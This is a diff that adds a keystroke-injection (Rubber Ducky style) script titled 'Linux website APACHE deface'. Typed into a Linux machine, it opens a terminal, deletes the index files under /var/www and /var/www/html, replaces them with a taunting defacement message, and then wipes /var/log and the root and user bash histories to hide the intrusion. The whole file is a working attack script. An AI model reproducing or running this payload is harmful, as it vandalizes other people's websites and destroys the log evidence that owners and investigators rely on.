@@ -1,0 +1,20 @@
+REM Linux website APACHE deface
+REM By: cypress
+DEFAULT_DELAY 200
+ALT F2
+STRING terminal
+ENTER
+STRING cd /var/www
+ENTER
+STRING rm index.*
+ENTER
+echo "Your site has been defaced, use better security next time" > index.html
+ENTER
+STRING cd html/
+ENTER
+STRING rm index.*
+ENTER
+STRING echo "Your site has been defaced, use better security next time" > index.html
+ENTER
+STRING rm /var/log/* && rm /root/.bash_history && rm /home/$USER/.bash_history
+ENTER
